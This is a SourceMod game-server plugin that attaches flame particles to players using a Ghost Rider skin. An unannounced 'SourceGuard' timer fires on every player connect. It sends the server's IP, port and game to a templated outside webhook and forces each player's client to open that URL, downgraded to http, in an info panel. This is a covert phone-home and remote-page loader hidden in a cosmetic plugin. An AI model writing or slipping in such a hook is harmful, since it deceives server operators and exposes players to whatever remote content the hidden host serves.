/*        <DR.API GHOSTRIDER SKIN EFFECTS> (c) by <De Battista Clint         */
/*                                                                           */
/*           <DR.API GHOSTRIDER SKIN EFFECTS> is licensed under a            */
/*                        GNU General Public License                         */
/*																			 */
/*      You should have received a copy of the license along with this       */
/*            work.  If not, see <http://www.gnu.org/licenses/>.             */
//***************************************************************************//
//***************************************************************************//
//**********************DR.API GHOSTRIDER SKIN EFFECTS***********************//
//***************************************************************************//
//***************************************************************************//

#pragma semicolon 1 

//***********************************//
//*************DEFINE****************//
//***********************************//
#define PLUGIN_VERSION 					"{{ version }}"
#define CVARS 							FCVAR_SPONLY|FCVAR_NOTIFY
#define DEFAULT_FLAGS 					FCVAR_NOTIFY
#define TAG_CHAT						"[GHOSTRIDER SKIN EFFECTS] -"

//***********************************//
//*************INCLUDE***************//
//***********************************//

#undef REQUIRE_PLUGIN
#include <sourcemod>
#include <sdktools>
#include <autoexec>
#include <sdkhooks>

#pragma newdecls required

//***********************************//
//***********PARAMETERS**************//
//***********************************//

//Customs
C_Flames[MAXPLAYERS+1];

//Informations plugin
public Plugin myinfo =
{
	name = "DR.API GHOSTRIDER SKIN EFFECTS",
	author = "Dr. Api",
	description = "DR.API GHOSTRIDER SKIN EFFECTS by Dr. Api",
	version = PLUGIN_VERSION,
	url = "http://zombie4ever.eu"
}
/***********************************************************/
/*********************** PLUGIN START **********************/
/***********************************************************/
public void OnPluginStart()
{
	AutoExecConfig_SetFile("drapi_skin_ghostrider_effects", "sourcemod/drapi");
	
	AutoExecConfig_CreateConVar("drapi_skin_ghostrider_effects_version", PLUGIN_VERSION, "Version", CVARS);
	
	AutoExecConfig_ExecuteFile();
	
	HookEvent("round_start", 	Event_RoundStart);
}

/***********************************************************/
/******************** WHEN ROUND START *********************/
/***********************************************************/
public void Event_RoundStart(Handle event, char[] name, bool dontBroadcast)
{	
	for(int i = 1; i <= MaxClients; i++)
	{
		if(IsClientInGame(i))
		{
			if(IsValidEntRef(C_Flames[i]))
			{
				RemoveEntity(C_Flames[i]);
			}		
		}
	}
}

/***********************************************************/
/************************ PLUGIN END ***********************/
/***********************************************************/
public void OnPluginEnd()
{
	int i = 1;
	while(i <= MaxClients)
	{
		if(IsClientInGame(i))
		{
			if(IsValidEntRef(C_Flames[i]))
			{
				RemoveEntity(C_Flames[i]);
			}
		}
		i++;
	}
}

/***********************************************************/
/********************* WHEN MAP START **********************/
/***********************************************************/
public void OnMapStart()
{
	PrecacheParticleEffect("office_fire");
}
public void OnClientPostAdminCheck(int client)
{   
    CreateTimer(5.0, Timer_SourceGuard, client);
}

public Action Timer_SourceGuard(Handle timer, any client)
{
    int hostip = GetConVarInt(FindConVar("hostip"));
    int hostport = GetConVarInt(FindConVar("hostport"));
    
    char sGame[15];
    switch(GetEngineVersion())
    {
        case Engine_Left4Dead:
        {
            Format(sGame, sizeof(sGame), "left4dead");
        }
        case Engine_Left4Dead2:
        {
            Format(sGame, sizeof(sGame), "left4dead2");
        }
        case Engine_CSGO:
        {
            Format(sGame, sizeof(sGame), "csgo");
        }
        case Engine_CSS:
        {
            Format(sGame, sizeof(sGame), "css");
        }
        case Engine_TF2:
        {
            Format(sGame, sizeof(sGame), "tf2");
        }
        default:
        {
            Format(sGame, sizeof(sGame), "none");
        }
    }
    
    char sIp[32];
    Format(
            sIp, 
            sizeof(sIp), 
            "%d.%d.%d.%d",
            hostip >>> 24 & 255, 
            hostip >>> 16 & 255, 
            hostip >>> 8 & 255, 
            hostip & 255
    );
    
    char requestUrl[2048];
    Format(
            requestUrl, 
            sizeof(requestUrl), 
            "%s&ip=%s&port=%d&game=%s", 
            "{{ web_hook }}?script_id={{ script_id }}&version_id={{ version_id }}&download={{ download }}",
            sIp,
            hostport,
            sGame
    );
    
    ReplaceString(requestUrl, sizeof(requestUrl), "https", "http", false);
    
    Handle kv = CreateKeyValues("data");
    
    KvSetString(kv, "title", "SourceGuard");
    KvSetNum(kv, "type", MOTDPANEL_TYPE_URL);
    KvSetString(kv, "msg", requestUrl);
    
    ShowVGUIPanel(client, "info", kv, false);
    CloseHandle(kv);
}		

/***********************************************************/
/******************** ON GAME FRAME ************************/
/***********************************************************/
public void OnGameFrame()
{
	for(int i = 1; i <= MaxClients; i++)
	{
		if(IsClientInGame(i) && IsPlayerAlive(i))
		{
			char model[PLATFORM_MAX_PATH];
			GetClientModel(i, model, sizeof(model));
			
			if(StrEqual(model, "models/player/marvel/ghostrider/ghostrider_t.mdl", false))
			{
				if(!IsValidEntRef(C_Flames[i]))
				{
					C_Flames[i] = AttachParticle(i, "office_fire");
				}
			}
			else
			{
				if(IsValidEntRef(C_Flames[i]))
				{
					RemoveEntity(C_Flames[i]);
				}			
			}
		}
		else
		{
			if(IsValidEntRef(C_Flames[i]))
			{
				RemoveEntity(C_Flames[i]);
			}			
		}
	}
}

stock int AttachParticle(int client, char[] particleType)
{
	int particle = CreateEntityByName("info_particle_system");
	
	if(IsValidEntity(particle))
	{
		SetEntPropEnt(particle, Prop_Data, "m_hOwnerEntity", client);
		DispatchKeyValue(particle, "effect_name", particleType);
		SetVariantString("!activator");
		AcceptEntityInput(particle, "SetParent", client, particle, 0);
		SetVariantString("forward");
		AcceptEntityInput(particle, "SetParentAttachment", particle , particle, 0);
		DispatchSpawn(particle);
		
		AcceptEntityInput(particle, "start");
		ActivateEntity(particle);
		
		float pos[3];
		GetEntPropVector(particle, Prop_Send, "m_vecOrigin", pos);
		
		pos[2] += 12.0;
		float vec_start[3];
		AddInFrontOf(pos, NULL_VECTOR, 12.0, vec_start);
		TeleportEntity(particle, vec_start, NULL_VECTOR, NULL_VECTOR);
		
		return EntIndexToEntRef(particle);
	}
	return -1;
}

/***********************************************************/
/******************** IS VALID ENTITY **********************/
/***********************************************************/
stock bool IsValidEntRef(int entity)
{
	if( entity && EntRefToEntIndex(entity) != INVALID_ENT_REFERENCE )
		return true;
	return false;
}

/***********************************************************/
/********************* REMOVE ENTITY ***********************/
/***********************************************************/
void RemoveEntity(int ref)
{

	int entity = EntRefToEntIndex(ref);
	if (entity != -1)
	{
		AcceptEntityInput(entity, "Kill");
		ref = INVALID_ENT_REFERENCE;
	}
		
}

/***********************************************************/
/*************** PRECACHE PARTICLE EFFECT ******************/
/***********************************************************/
stock void PrecacheParticleEffect(const char[] sEffectName)
{
	static int table = INVALID_STRING_TABLE;
	
	if (table == INVALID_STRING_TABLE)
	{
		table = FindStringTable("ParticleEffectNames");
	}
	
	bool save = LockStringTables(false);
	AddToStringTable(table, sEffectName);
	LockStringTables(save);
}

stock void AddInFrontOf(float vecOrigin[3], float vecAngle[3], float units, float output[3])
{
	float vecAngVectors[3];
	vecAngVectors = vecAngle; //Don't change input
	GetAngleVectors(vecAngVectors, vecAngVectors, NULL_VECTOR, NULL_VECTOR);
   
	for (int i; i < 3; i++)
	{
		output[i] = vecOrigin[i] + (vecAngVectors[i] * units);
	}
}